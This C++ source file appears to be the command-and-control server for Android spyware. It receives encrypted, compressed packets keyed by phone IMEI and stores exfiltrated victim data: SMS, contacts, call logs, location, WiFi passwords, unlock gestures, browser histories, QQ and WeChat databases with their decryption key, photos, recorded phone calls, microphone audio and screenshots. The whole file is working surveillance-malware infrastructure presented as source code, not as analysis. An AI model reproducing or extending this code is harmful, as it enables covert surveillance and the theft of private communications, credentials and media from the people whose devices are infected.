
#include <windows.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "DataProcess.h"
#include "WatchDog.h"
#include <stdlib.h>
#include "Additional.h"
#include "FileWriter.h"
#include "CryptoUtils.h"
#include <Dbghelp.h>
#include "NotifyDataServer.h"
#include "mysqlOper.h"
#include "LargeFile.h"

#include <string>

using namespace std;

#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"lib/zlib.lib")

#define PACK_SIZE_ERROR		-1
#define PACK_ID_ERROR		-2
#define PACK_CMD_ERROR		-3
#define PACK_ALLOC_ERROR	-4
#define PACK_COMP_ERROR		-5
#define PACK_EXCEPT_ERROR	-6
#define PACK_MYSQL_ERROR	-7
#define PACK_FILE_ERROR		-8


DWORD __stdcall DataProcess::DataProcessor(LPDATAPROCESS_PARAM lpparam) {
	DATAPROCESS_PARAM stparam = *lpparam;
	char szLog[1024];
	char *lpdata = 0;
	__try{
		lpdata = new char[NETWORK_DATABUF_SIZE +1024];
		if (lpdata == FALSE) {
			WriteLogFile("DataProcess new recv buffer error:-4\r\n");
			closesocket(stparam.sockclient);
			return FALSE;
		}

		int ret = DataProcessMain(&stparam, &lpdata);
		if (ret < 0)
		{
			char szerr[1024];
			wsprintfA(szerr, "\r\nDataProcess error code:%d", ret);
			ErrorFormat(&stparam, szLog, szerr);
			WriteLogFile(szLog);
			WriteErrorPacket(szLog, lpdata, ERRORPACKETSIZE);
		}

		delete[] lpdata;
		lpdata = 0;
		closesocket(stparam.sockclient);
		stparam.sockclient = 0;
		return ret;
	}
	__except(1) {
		ErrorFormat(&stparam, szLog, "DataProcessor exception");
		WriteLogFile(szLog);
		__try {
			if (lpdata)
			{
				delete[] lpdata;
				lpdata = 0;
			}
			if (stparam.sockclient)
			{
				closesocket(stparam.sockclient);
				stparam.sockclient = 0;
			}
		}
		__except (1) {
			WriteLogFile("DataProcessor exception in exception");
		}

		return FALSE;
	}

}





DWORD __stdcall DataProcess::DataProcessMain(LPDATAPROCESS_PARAM lpparam,char ** lpdata){
	__try{
		int iret = 0;

		char szout[1024];

		int iRecvLen = recv(lpparam->sockclient,*lpdata,NETWORK_DATABUF_SIZE,0);
		if (iRecvLen < sizeof(COMMUNICATION_PACKET_HEADER)){
			WriteLogFile("recv packet too small error\r\n");
			return -1;
		}

		LPCOMMUNICATION_PACKET_HEADER lphdr = (LPCOMMUNICATION_PACKET_HEADER)*lpdata;
		unsigned char imei[IMEI_IMSI_PHONE_SIZE*2] = {0};
		if ( (lphdr->reservedname & PACKET_CRYPT_ALL_FLAG) == PACKET_CRYPT_ALL_FLAG && *(WORD*)(lpdata + sizeof(COMMUNICATION_PACKET_HEADER) + 4) != 0X9C78)
		{
			iret = CryptoUtils::xorCryptData(lphdr->imei, IMEI_IMSI_PHONE_SIZE, (char*)gKey.c_str(), IMEI_IMSI_PHONE_SIZE, lphdr->imei, IMEI_IMSI_PHONE_SIZE);
		}
		memcpy(imei,lphdr->imei,IMEI_IMSI_PHONE_SIZE);
		iret = Additional::checkImei(imei);
		if (iret == FALSE)
		{
			WriteLogFile("recv packet check imei error\r\n");
			return -2;
		}

		unsigned char username[IMEI_IMSI_PHONE_SIZE*2] = {0};
		if ((lphdr->reservedname & PACKET_CRYPT_ALL_FLAG) == PACKET_CRYPT_ALL_FLAG && *(WORD*)(lpdata + sizeof(COMMUNICATION_PACKET_HEADER) + 4) != 0X9C78)
		{
			iret = CryptoUtils::xorCryptData(lphdr->username, IMEI_IMSI_PHONE_SIZE, (char*)gKey.c_str(), IMEI_IMSI_PHONE_SIZE, lphdr->username, IMEI_IMSI_PHONE_SIZE);
		}
		memcpy(username, lphdr->username, IMEI_IMSI_PHONE_SIZE);
		iret = Additional::checkUserName(username);
		if (iret == FALSE)
		{
			WriteLogFile("recv packet check username error\r\n");
			return -2;
		}

		//SpecialAccounts::change(username);

		if (lphdr->dwcmd >= COMMAND_VALUE_LIMIT || lphdr->dwcmd <= 0 )
		{
			wsprintfA(szout,"recv packet check command:%u error\r\n",lphdr->dwcmd);
			WriteLogFile(szout);
			return -3;
		}

		if (lphdr->dwcmd == SUPER_CMD_STOP && (lstrcmpiA((char*)username,SUPER_USERNAME) == 0) && (lstrcmpiA((char*)imei,SUPER_IMEI) == 0) )
		{
			wsprintfA(szout,"recv user:%s,imei:%s,command:%u\r\n", username, imei, lphdr->dwcmd);
			WriteLogFile(szout);
			Sleep(3000);
			ExitProcess(0);
		}

		DWORD dwBufLimit = NETWORK_DATABUF_SIZE+1024;
		int iBlockSize = lphdr->dwsize;		
		if (iBlockSize <= NETWORK_DATABUF_SIZE && iBlockSize >= sizeof(COMMUNICATION_PACKET_HEADER) )
		{
			//normal packet
		}
		else if (iBlockSize > NETWORK_DATABUF_SIZE && iBlockSize <= LIMIT_DATA_SIZE){
			dwBufLimit = iBlockSize + 1024;
			char * largebuf = new char[dwBufLimit + 1024];
			if (largebuf == FALSE){
				wsprintfA(szout,"new large buf size:%u error\r\n",dwBufLimit);
				WriteLogFile(szout);
				return -4;
			}
			else{
				memcpy(largebuf,*lpdata,iRecvLen);
				delete [] (* lpdata);
				*lpdata = largebuf;
				lphdr = (LPCOMMUNICATION_PACKET_HEADER)(*lpdata);
			}
		}
		else if(iBlockSize > LIMIT_DATA_SIZE && (lphdr->reservedname & PACKET_COMPRESS_FLAG) ){
			wsprintfA(szout, "recv header cmd:%d,block size:%d but compressed,user:%s,imei:%s\r\n",
				lphdr->dwcmd, iBlockSize,username,imei);
			WriteLogFile(szout);
			return -1;
		}
		else if (iBlockSize > LIMIT_DATA_SIZE && (lphdr->reservedname & PACKET_COMPRESS_FLAG) == 0 ) {
			wsprintfA(szout, "recv header cmd:%d,block size:%d,user:%s,imei:%s\r\n",
				lphdr->dwcmd, iBlockSize, username, imei);
			WriteLogFile(szout);

			return (int)LargeFile::recvLargeFile(lpparam,*lpdata,iRecvLen,lphdr,(char*)username, (char*)imei);
		}
		else {
			wsprintfA(szout, "recv header cmd:%d,block size:%d,user:%s,imei:%s\r\n",
				lphdr->dwcmd, iBlockSize, username, imei);
			WriteLogFile(szout);
			return -1;
		}

		while ((int)iBlockSize > iRecvLen)
		{
			int tmpsize = recv(lpparam->sockclient, (*lpdata) + iRecvLen, dwBufLimit - iRecvLen,0);
			if (tmpsize > 0)
			{
				iRecvLen += tmpsize;
			}
			else
			{	iret = WSAGetLastError();
				if (iret == 0 || iBlockSize == iRecvLen)
				{
					break;
				}else{
					wsprintfA(szout,"cmd:%d,block size:%d,recved size:%d error,user:%s,imei:%s\r\n",
						lphdr->dwcmd,iBlockSize,iRecvLen,username,imei);
					WriteLogFile(szout);
					return -1;
				}
			}
		}

		if (iBlockSize != iRecvLen)
		{
			wsprintfA(szout, "cmd:%u,block size:%d and recved size:%d not equal error,user:%s,imei:%s\r\n",
				lphdr->dwcmd,iBlockSize, iRecvLen,username,imei);
			WriteLogFile(szout);
			return -1;
		}

		char * lpdatablock = (*lpdata) + sizeof(COMMUNICATION_PACKET_HEADER) ;
		int datablocksize = iBlockSize - sizeof(COMMUNICATION_PACKET_HEADER) ;
		if ( lphdr->reservedname & PACKET_CRYPT_ALL_FLAG)
		{
			if (*(WORD*)(lpdatablock + 4) == 0x9c78) {
				WriteLogFile("recv ignormal eccrypt packet\r\n");
			}
			else {
				iret = CryptoUtils::xorCryptData(lpdatablock, datablocksize, (char*)imei, IMEI_IMSI_PHONE_SIZE, lpdatablock, datablocksize);
			}
		}
		
		if (lphdr->reservedname & PACKET_COMPRESS_FLAG)
		{
			int uncompsize = *(int*)lpdatablock;
			if (uncompsize > MAX_UNZIP_BUF_SIZE || uncompsize <= 0)
			{
				wsprintfA(szout, "compressed data size:%u error,user:%s,imei:%s\r\n", uncompsize,username,imei);
				WriteLogFile(szout);
				return -5;
			}

			unsigned char * payload = (unsigned char *)(lpdatablock + sizeof(DWORD));
			int payloadsize = datablocksize - sizeof(DWORD);
			unsigned long unzipbufLen = uncompsize + 1024;
			unsigned char* unzipbuf = new unsigned char[unzipbufLen];
			if (unzipbuf == FALSE)
			{
				WriteLogFile("new unzip buffer error\r\n");
				return -4;
			}

			iret = uncompress((Bytef*)unzipbuf, (uLongf*)&unzipbufLen, (Bytef*)payload,payloadsize);
			if (iret != Z_OK  ) {
				delete[]unzipbuf;
				wsprintfA(szout,"uncompress error,compressed data size:%u ,uncompressed data size:%u,src data size:%u\r\n",
					payloadsize,unzipbufLen, uncompsize);
				WriteLogFile(szout);
				return -5;
			}
			*(char*)(unzipbuf + unzipbufLen) = 0;

			iret = DataWriter(lpparam,lphdr, (char*)unzipbuf, unzipbufLen, (char*)username, (char*)imei);

			delete[] unzipbuf;
		}
		else {
			*(char*)(lpdatablock + datablocksize) = 0;
			iret = DataWriter(lpparam,lphdr, lpdatablock, datablocksize, (char*)username, (char*)imei);
		}

		int network = lphdr->reservedname & (CLIENT_NETWORK_TYPE_WIFI | CLIENT_NETWORK_TYPE_WIRELESS);
		WatchDog::CheckIfOnlineExist((char*)imei, (char*)username, network, lpparam->sockclient, lpparam->si, THREAD_DATA, lpparam->threadid);

		return iret;

	}
	__except (1) {
		WriteLogFile("data process main exception\r\n");
	}

	return -6;
}



DWORD __stdcall DataProcess::DataWriter(LPDATAPROCESS_PARAM lpparam, LPCOMMUNICATION_PACKET_HEADER lphdr, 
	char * lpdata, int len,char * username,char * imei) {

	//test code
	//WriteErrorPacket("process packet:", lpdata, ERRORPACKETSIZE);

	int iret = 0;
	string filename = string(lpparam->currentpath) + "\\" + username + "\\" + imei + "\\";
	if (lphdr->dwcmd == CMD_DATA_MESSAGE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), MESSAGE_FILENAME, lpdata, len, CREATE_ALWAYS,username,imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_LATESTMESSAGE) {

		iret = FileWriter::writeDataFile(filename.c_str(), MESSAGE_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_DEVICEINFO)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), DEVICEINFO_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CONTACTS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CONTACTS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CALLLOG)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CALLLOG_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_NEWCALLLOG)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CALLLOG_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_LOCATION)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), LOCATION_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_APPPROCESS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), APPPROCESS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_RUNNINGAPPS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), RUNNINGAPPS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_SDCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), SDCARDFILES_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_FLASHCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FLASHCARDFILES_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_EXTCARDFILES)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), EXTCARDFILES_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WIFIPASS)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WIFIPASS_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_GESTURE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), GESTURE_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WIFI) {
		iret = FileWriter::writeDataFile(filename.c_str(), WIFI_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOAD_LOG) {
		iret = FileWriter::writeDataFile(filename.c_str(), RUNNING_LOG_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQACCOUNT)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), QQACCOUNT_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEBKITHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEBKITHISTORY_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CHROMEHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), CHROMEHISTORY_FILE_NAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_FIREFOXHISTORY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FIREFOXRECORD_FILE_NAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}

	else  if (lphdr->dwcmd == CMD_DATA_FILERECORD)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), FILERECORD_FILE_NAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UNINSTALL)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), UNINSTALL_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINDATABASEFILE)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEXINDATABASE_FILENAME, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINUSERINFO)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEXINUSERINFO_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_WEIXINDB_KEY)
	{
		iret = FileWriter::writeDataFile(filename.c_str(), WEIXINDBKEY_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}

	else if (lphdr->dwcmd == CMD_DATA_DCIM)
	{
		filename = filename + "DCIM\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_DOWNLOAD)
	{
		filename = filename + "Download\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_AUDIO)
	{
		filename = filename + "Audio\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_VIDEO)
	{
		filename = filename + "Video\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_CAMERAPHOTO) {
		filename = filename + "CameraPhoto\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_SCRNSNAPSHOT)
	{
		filename = filename + "ScreenSnapshot\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_PHONECALLAUDIO)
	{
		filename = filename + "PhoneCallAudio\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_MICAUDIORECORD)
	{
		filename = filename + "MicAudioRecord\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_OFFICE) {
		filename = filename + "OfficeFiles\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQFILE) {
		filename = filename + "QQFiles\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQAUDIO)
	{
		filename = filename + "QQAudio\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQPROFILE)
	{
		filename = filename + "QQHead\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQPHOTO)
	{
		filename = filename + "QQPhoto\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_QQVIDEO)
	{
		filename = filename + "QQVideo\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINPHOTO) {
		filename = filename + "WeiXinPhoto\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINAUDIO)
	{
		filename = filename + "WeiXinAudio\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_WEIXINVIDEO)
	{
		filename = filename + "WeiXinVideo\\";
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_DATA_APPMESSAGE)
	{
		iret = FileWriter::writeFile(filename, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_QQDATABASEFILE)
	{
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOADQQDB)
	{
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, TRUE, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOADWEIXINDB)
	{
		iret = FileWriter::writeFile(filename, lpdata, len, CREATE_ALWAYS, TRUE, username, imei);
	}
	else if (lphdr->dwcmd == CMD_UPLOADWEIXININFO)
	{
		iret = FileWriter::writeDataFile(filename, WEIXINUSERINFO_FILENAME, lpdata, len, OPEN_ALWAYS, username, imei);
	}
	else {
		iret = PACK_CMD_ERROR;
	}

	/*
	lphdr->dwsize = 0;
	lphdr->dwcmd = CMD_RECV_DATA_OK;
	int ret = send(stparam.sockclient, lpdata, sizeof(COMMUNICATION_PACKET_HEADER), 0);
	if (ret <= 0)
	{
		closesocket(stparam.sockclient);
		delete[] lpdata;
		return FALSE;
	}*/
	return iret;
}



DWORD __stdcall DataProcess::DataNotify(string filename) {
	CMDNOTIFY notify = { 0 };
	notify.type = 1;
	notify.len = lstrlenA(filename.c_str());
	lstrcpyA(notify.szparam, filename.c_str());
	int iret = NotifyDataServer::NotifyData(&notify);
	return iret;
}